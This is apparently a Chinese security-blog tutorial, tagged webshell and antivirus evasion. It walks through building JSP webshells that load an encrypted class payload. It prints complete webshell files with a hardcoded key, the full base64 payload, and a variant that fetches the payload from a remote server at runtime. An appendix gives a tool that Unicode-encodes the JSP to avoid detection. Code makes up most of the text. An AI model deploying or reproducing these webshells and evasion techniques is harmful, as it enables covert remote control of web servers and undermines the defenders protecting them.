**拓展：代码讲解（代码有技巧，值得细品）**

1.定义的参数类型为什么是ArrayList<Object>呢？

2.最后一个添加的参数this.getClass().getClassLoader()有什么寓意呢？

**（2）变换加载方式**

上一种方法即将加密后的class放入到文件中生成的网页马是比较大的，把class取出后文件的内容立马变成了601字节，也就是说class的内容占网页马的绝大部分内容。为了缩小网页马文件的大小，我们可以把class和执行文件分离，即变换加载方式。

![](https://p0.ssl.qhimg.com/t01efcdb9c4646debe1.png)

我们将之前的txt放入到一个shell.txt文件中，

    
    
    yv66vgAAADQAUQoAEQAlCgARACYKABEAJwcAKAoABAApBwAqCAArCgAsAC0HAC4KAAYALwoACQAwCgAsADEHADIKAA0AJgoADQAzBwA0BwA1CgAQACUKACwANgoAEAA3CgA4ADkKADoAOwcAPAEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAAygpVgEAAWcBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAA1TdGFja01hcFRhYmxlBwA8AQAKU291cmNlRmlsZQEAB2J4LmphdmEMABgAGQwAGAAcDAA9AD4BABNqYXZhL3V0aWwvQXJyYXlMaXN0DAA/AEABABBqYXZhL2xhbmcvU3RyaW5nAQADQUVTBwBBDABCAEMBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDABEAEUMABgARgwARwBIAQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwASQBKAQACYngBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMAEsATAwAHQAeBwBNDABOAE8HAFAMAB8AIAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQADZ2V0AQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQAPamF2YS9sYW5nL0NsYXNzAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvbGFuZy9PYmplY3QAIQAQABEAAAAAAAQAAQAYABkAAQAaAAAAHgACAAIAAAAGKiu3AAGxAAAAAQAbAAAABgABAAAABgABABgAHAABABoAAAAdAAEAAQAAAAUqtwACsQAAAAEAGwAAAAYAAQAAAAcAAQAdAB4AAQAaAAAAIQAEAAIAAAAJKisDK763AAOwAAAAAQAbAAAABgABAAAACQABAB8AIAABABoAAADEAAYABwAAAG0rwAAETSwDtgAFwAAGTiwEtgAFwAAGOgQSB7gACDoFGQUFuwAJWS22AAoSB7cAC7YADLsADVm3AA4ZBLYADzoGuwAQWSwGtgAFwAARtwASGQUZBrYAE7YAFLYAFSwFtgAFtgAWV6cABk0DrASsAAEAAABlAGgAFwACABsAAAAuAAsAAAAPAAUAEAAOABEAGAATAB8AFAAyABUAQAAWAGUAHABoABkAaQAbAGsAHQAhAAAACQAC9wBoBwAiAgABACMAAAACACQ=
    

**A.绝对路径加载**

使用shel.txt的绝对路径进行加载其中的内容进行访问。  
关于文件加载的方式参考链接如下：  
Java读取文件内容的六种方法：<https://www.cnblogs.com/hkgov/p/14707726.html>

我们选择Files.readAllBytes()方法，即先将数据读取为二进制数组，然后转换成String内容，达到一次性的快速读取一个文件的内容转为String的目的。主要代码如下：

    
    
    String filename = "D:\\xampp\\tomcat\\webapps\\ROOT\\shell.txt"; //txt存放的路径
    byte[] bytes = Files.readAllBytes(Paths.get(filename));
    String content = new String(bytes, StandardCharsets.UTF_8);
    

上面为主要代码，下面我们将代码与上面的webshell进行一个简单的融合，大致代码如下：shell10.jsp

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.nio.file.*,java.nio.charset.*"%>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
    public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
    <%if (request.getMethod().equals("POST")){
    String filename = "D:\\xampp\\tomcat\\webapps\\ROOT\\shell.txt";
    byte[] bytes = Files.readAllBytes(Paths.get(filename));
    String content = new String(bytes, StandardCharsets.UTF_8);
    
    
    String k="e45e329feb5d925b";
    session.putValue("u",k);
    String p=request.getReader().readLine();
    ArrayList<Object> t=new ArrayList<Object>();
    t.add(k);
    t.add(p);
    t.add(pageContext);
    t.add(this.getClass().getClassLoader());
    new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(content)).newInstance().equals(t);}
    %>
    

运行结果如下：

![](https://p3.ssl.qhimg.com/t019cca883327aa50bf.png)

**B.相对路径加载**

上面说了绝对路径，简便，但是实际中大多情况下我们都无法直接知道网站的绝对路径是什么，只能知道文件的一个相对路径，此时我们需要用到的就是相对路径啦！  
参考链接：<https://www.jb51.net/article/124392.htm>

![](https://p1.ssl.qhimg.com/t01f868d0ba5caf47cf.png)

如上图，我们尝试使用 `new java.io.File` 方法。主要的加载代码如下：

    
    
    String filename =  new java.io.File(application.getRealPath(request.getRequestURI())).getParent() + "\\shell.txt";
    

总代码如下：shell11.jsp

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.nio.file.*,java.nio.charset.*"%>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
    public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
    <%if (request.getMethod().equals("POST")){
    String filename =  new java.io.File(application.getRealPath(request.getRequestURI())).getParent() + "\\shell.txt";
    byte[] bytes = Files.readAllBytes(Paths.get(filename));
    String content = new String(bytes, StandardCharsets.UTF_8);
    
    String k="e45e329feb5d925b";
    session.putValue("u",k);
    String p=request.getReader().readLine();
    ArrayList<Object> t=new ArrayList<Object>();
    t.add(k);
    t.add(p);
    t.add(pageContext);
    t.add(this.getClass().getClassLoader());
    new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(content)).newInstance().equals(t);}
    %>
    

运行结果如下：

![](https://p3.ssl.qhimg.com/t0193e7aef507dadadb.png)

**C.远程路径加载**

参考链接：  
Java读取远程服务器上的txt文件  
<https://www.cnblogs.com/dumanqingren/articles/2025291.html>  
这里为了便于代码的阅读，我们把远程读取txt内容单独定义在一个函数，注意哦，jsp定义的语法为 `<%! %>`
，代码如下，我们传入远程的地址链接，然后函数读取后会返回一个String类型的遍历。

    
    
    <%!
    public String ReadUrl(String FileName) throws IOException{
        String read;
        String readStr ="";
        try{
            URL url =new URL(FileName);
            HttpURLConnection urlCon = (HttpURLConnection)url.openConnection();
            urlCon.setConnectTimeout(5000);
            urlCon.setReadTimeout(5000);
            BufferedReader br =new BufferedReader(new InputStreamReader( urlCon.getInputStream()));
            while ((read = br.readLine()) !=null) {
                readStr = readStr + read;
            }
            br.close();
        }
        catch (IOException e) {
            // TODO Auto-generated catch block
            readStr ="f";
        }
        return readStr;
    }%>
    

函数调用语句如下：

    
    
    String filename = "http://192.168.1.195:8080/payload/shell.txt";
    String content = ReadUrl(filename);
    

完整代码如下：shell12.jsp

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.io.*,java.net.*"%>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}
    public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
    <%!
    public String ReadUrl(String FileName) throws IOException{
        String read;
        String readStr ="";
        try{
            URL url =new URL(FileName);
            HttpURLConnection urlCon = (HttpURLConnection)url.openConnection();
            urlCon.setConnectTimeout(5000);
            urlCon.setReadTimeout(5000);
            BufferedReader br =new BufferedReader(new InputStreamReader( urlCon.getInputStream()));
            while ((read = br.readLine()) !=null) {
                readStr = readStr + read;
            }
            br.close();
        }
        catch (IOException e) {
            // TODO Auto-generated catch block
            readStr ="f";
        }
        return readStr;
    }%>
    <%if (request.getMethod().equals("POST")){
    
    String filename = "http://192.168.1.195:8080/payload/shell.txt";
    String content = ReadUrl(filename);
    
    String k="e45e329feb5d925b";
    session.putValue("u",k);
    String p=request.getReader().readLine();
    ArrayList<Object> t=new ArrayList<Object>();
    t.add(k);
    t.add(p);
    t.add(pageContext);
    t.add(this.getClass().getClassLoader());
    new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(content)).newInstance().equals(t);}
    %>
    

运行结果如下：

![](https://p1.ssl.qhimg.com/t01333dd8bfa49d3b88.png)

## 附录

###  1.JAVA之unicode编码代码测试

我们可以直接将需要转换的代码放在当前工程运行的文件夹下的jsp.txt文件，会自动将编码后的字符串存放到UnicdoeJsp.txt文件中，工程目录如下：

![](https://p5.ssl.qhimg.com/t0124331577fbb83ee0.png)

文件操作类fileutils如下：

    
    
    import java.io.*;
    
    public class fileutils {
        /**
         **以字符的方式读取文件
         */
        public static String ReadJsp(String filePath) {
            //读取文件
            BufferedReader br = null;
            StringBuffer sb = null;
            try {
                br = new BufferedReader(new InputStreamReader(new FileInputStream(filePath),"GBK")); //这里可以控制编码
                sb = new StringBuffer();
                String line = null;
                while((line = br.readLine()) != null) {
                    sb.append(line);
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    br.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }   
            }        
            String data = new String(sb); //StringBuffer ==> String
    //        System.out.println("数据为==> " + data);
            return data;
        }
    
        /*创建文件并写入内容*/
        public static void CreateFile(String filepath, String file_str) {
            try {
            File filename = new File(filepath);
            if(filename.createNewFile()) {
                System.out.println("123文件创建成功！");
            } else {
                System.out.println("123文件创建失败！");
            }
            System.out.println(file_str);
            FileOutputStream fos = new FileOutputStream(filename);
            fos.write(file_str.getBytes());
            fos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    
        /*删除文件*/
        public static void DeleteFile(String filepath) {
            File filename = new File(filepath);
            if(filename.exists()) {
                 filename.delete();
                 System.out.println("文件删除成功！");
            }else {
                System.out.println("文件不存在，无需删除！");
            }
            return;
        }
    
    }
    

unicode编码的类unicode01代码如下：（PS：它将会对所有的的字母和数字进行编码）

    
    
    public class unicode01 {
        /**
         **JSP字符串转unicode
         */
        public static String jspToUnicode(String str) {
            StringBuffer sb = new StringBuffer();
            char[] c = str.toCharArray();
            for (int i = 0; i < c.length; i++) {
    //            System.out.println(c[i]);
                if(Character.isLetterOrDigit(c[i])) {
                    sb.append("\\u00" + Integer.toHexString(c[i]));
                }else {
                    sb.append(c[i]);
                }
    
            }
            return sb.toString();
        }
        //key转化为unicode
        public static String[] keyToUnicode(String[] str) {
            System.out.println("key转化为unicode\n");
            String[] unkey = new String[str.length];
            for(int i=0; i<str.length; i++) {
                StringBuffer sb = new StringBuffer();
                char[] c = str[i].toCharArray();
                for (int j = 0; j < c.length; j++) {
                    sb.append("\\u00" + Integer.toHexString(c[j]));
                }
                System.out.println(sb);
                unkey[i] = sb.toString();
            }
    
            return unkey;
        }
    
    
        public static void main(String[] args) {
            String filepath =  System.getProperty("user.dir") + "\\bin\\study\\jsp.txt";
            String str = fileutils.ReadJsp(filepath);//以字符串 的形式读取文件内容
    //        System.out.println(str);
            String unicode = jspToUnicode(str); //将字符串转化为unicode
            System.out.println("字符串转unicode结果：\n" + unicode);
    
            /** 为了保证程序的正常运行有些字符串不需要替换 
             ** 本来是打算将key进行unicode编码，然后在unicode编码后的字符串str中匹配key，然后发现replaceAll无法匹配 \\u的内容。。。
             ** 因此就需要读者手工将其替换调。
             ** 这里会输入key对应的unicode编码，然后读者在生成的文件中手工替换调对应的unicode即可
             **/
            String[] key = {"java.util.*,javax.crypto.*,javax.crypto.spec.*","POST", "e45e329feb5d925b", "\"u\"", "AES"};//不需要转换为关键字
            String[] unkey = keyToUnicode(key);
    //        for(int i=0; i<unkey.length; i++) {
    //            unicode = unicode.replaceFirst(unkey[i], key[i]);
    //        }
    //        System.out.println("特殊的字符串还原后：\n" + unicode);
    
    
            //写入文件
            String newfile =  System.getProperty("user.dir") + "\\bin\\study\\UnicodeJsp.txt";
            fileutils.DeleteFile(newfile);
            fileutils.CreateFile(newfile, unicode);
    
        }
    }
    

使用方法：  
运行类unicode01后，输出结果如下：需要替换的key在如下的位置。

![](https://p5.ssl.qhimg.com/t0186111413eb457883.png)

我们在生成的UnicdoeJsp.txt文件中，将对应的unicode替换为key数组中的key，（PS：在这里，我们需要替换的”u”即\u0022\u0075\u0022，双引号是正常的，即他们存在的形式为”\u0075”，将它转换为”u”即可）。

## 参考链接：

Java读取文件内容的六种方法  
<https://www.cnblogs.com/hkgov/p/14707726.html>

JSP页面定义函数方法  
<https://blog.csdn.net/iteye_6792/article/details/82522373>

[Java]读取文件方法大全  
<https://www.cnblogs.com/lovebread/archive/2009/11/23/1609122.html>

java中如何读取文件  
<https://www.php.cn/java/base/436165.html>

Java 流(Stream)、文件(File)和IO  
<https://www.runoob.com/java/java-files-io.html>

Java的绝对路径和相对路径  
<https://www.cnblogs.com/xzwblog/p/6906167.html>

java安全策略 禁止反射_初探java安全之反射：  
[https://blog.csdn.net/weixin_42364833/article/details/114244811?utm_source=app&app_version=4.9.1&code=app_1562916241&uLinkId=usr1mkqgl919blen](https://blog.csdn.net/weixin_42364833/article/details/114244811?utm_source=app&app_version=4.9.1&code=app_1562916241&uLinkId=usr1mkqgl919blen)

java将字符串转换成可执行代码  
[https://blog.csdn.net/u013305864/article/details/79665069?utm_source=app&app_version=4.9.1&code=app_1562916241&uLinkId=usr1mkqgl919blen](https://blog.csdn.net/u013305864/article/details/79665069?utm_source=app&app_version=4.9.1&code=app_1562916241&uLinkId=usr1mkqgl919blen)

作者：Xor0ne  
续写时间：20210616-20210618

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Xor0ne** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/245853](/post/id/245853)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [webshell](/tag/webshell)
  * [免杀](/tag/免杀)

 **+1** __9赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=AAS8C314G3ficE3yXBjJbhg&s=40&t=1585272061)
Xor0ne

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

